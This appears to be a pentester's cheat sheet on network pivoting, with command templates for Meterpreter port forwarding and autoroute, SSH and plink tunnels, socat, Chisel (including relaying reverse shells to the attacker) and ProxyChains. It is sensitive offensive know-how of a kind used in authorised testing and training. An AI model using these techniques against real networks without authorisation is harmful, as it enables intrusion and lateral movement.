---
layout: default
title: Pivoting
tags:
    - chisel
    - meterpreter
    - proxychains
    - ssh
    - tunneling
---
# Pivoting
## Metasploit
### Port forwarding
With meterpreter session on dual homed machine
```shell
portfwd add -l [LOCAL PORT] -p [TARGET PORT] -r [TARGET IP]  # Add port forwarding
```
- `-R` for reverse

```shell
portfwd delete -l [LOCAL PORT] -p [TARGET PORT] -r [TARGET IP]  # Delete specific forwarding
portfwd list                                                    # List
portfwd flush                                                   # Delete all forwardings
```

### Dynamic forwarding
With meterpreter session on dual homed machine
```shell
run autoroute -s [TARGET SUBNET]         # Adds route for [TARGET SUBNET]
run autoroute -p                         # Show active routes
route                                    # View accessible networks
route add 10.10.10.0 255.255.255.0 1     # Add route to 10.10.10.0/24 via session 1
route delete 10.10.10.0 255.255.255.0 1  # Delete specific route
route flush                              # Delete all routes
```

## SSH Tunneling
From within SSH session `~C` to access options, otherwise restructure as `ssh [TUNNELING COMMANDS] user@10.10.10.10`

### Local forwarding
```shell
-L [LOCAL PORT]:[TARGET IP]:[REMOTE PORT]
```
- Forwards a local port to a remote `ip:port`

![local forwarding](../ssh-local.png)

![local forwarding](../ssh-local2.png)

### Remote forwarding
```shell
-R [REMOTE PORT]:[TARGET IP]:[TARGET PORT]
```
- Forwards a remote port to a `ip:port` reachable by you (may be `localhost`)

![remote forwarding](../ssh-remote.png)

![remote forwarding](../ssh-remote2.png)

### SSH from remote to local machine
If you don't have an SSH session, create an SSH session with your machine
- Create local user
```shell
useradd -M pentest  # no home directory
usermod -L pentest  # lock account
usermod -s /bin/false pentest  # set shell to /bin/false
service ssh start
```
- Open SSH session from remote host 
```shell
ssh -R [REMOTE PORT]:[TARGET IP]:[KALI PORT] pentest@10.10.10.10
```

## Plink (PuTTY Link)
Locally
```shell
service ssh start
```
- Transfer `/usr/share/windows-binaries/plink.exe` to target

Remotely
```shell
plink.exe [SSH IP] -P 22 -C -N -L [LOCAL PORT]:[TARGET IP]:[REMOTE PORT] -l user -pw pass   # Local
plink.exe [SSH IP] -P 22 -C -N -R [REMOTE PORT]:[TARGET IP]:[TARGET PORT] -l user -pw pass  # Remote
```

## SOCAT (Linux)
On dual-homed host
```shell
socat TCP4-LISTEN:[LOCAL PORT],fork TCP4:[TARGET IP]:[TARGET PORT]
```
- Forwards `[LOCAL PORT]` to `[TARGET IP]:[TARGET PORT]`

## Chisel
SSH, but reversed; you are the Chisel server and the remote host is the client

### Local Pivot
- Remote port (client) → local port (server)
- We are listening (we are the server)
- Useful for forwarding reverse shells from remote host to our machine

Run locally (server)
```shell
chisel server -p [LISTEN PORT]
```

Run remotely (client)
```shell
chisel client [SERVER IP]:[SERVER PORT] [TUNNEL LISTEN PORT ON CLIENT]:[TUNNEL TARGET]:[TUNNEL PORT]
```

### Reverse Pivot
- Local port (server) → remote port (client)
- We are listening (we are the server)
- Useful for reaching machines through a remote host

Run locally (server)
```shell
chisel server -p [LISTEN PORT] -reverse
```

Run remotely (client)
```shell
chisel client [SERVER IP]:[SERVER PORT] R:[TUNNEL LISTEN PORT ON SERVER]:[TUNNEL TARGET]:[TUNNEL PORT]
```

## ProxyChains
Configure `/etc/proxychains.conf` to use a SOCKS5 proxy
```shell
socks5 127.0.0.1 1080
```
Run commands through proxychains
```shell
proxychains nmap -Pn -sT ...
```

## References
- <https://raw.githubusercontent.com/21y4d/Notes/master/Pivoting.txt>
- <https://www.bogotobogo.com/Linux/linux_Secure_Shell_SSH_V_ssh_Reverse_SSH_Tunnel_Remote_Port_Forwarding.php>
    - All credit for SSH tunelling diagrams goes here; they are simply too good to pass up
- <https://www.youtube.com/watch?v=Yp4oxoQIBAM>
- <https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/>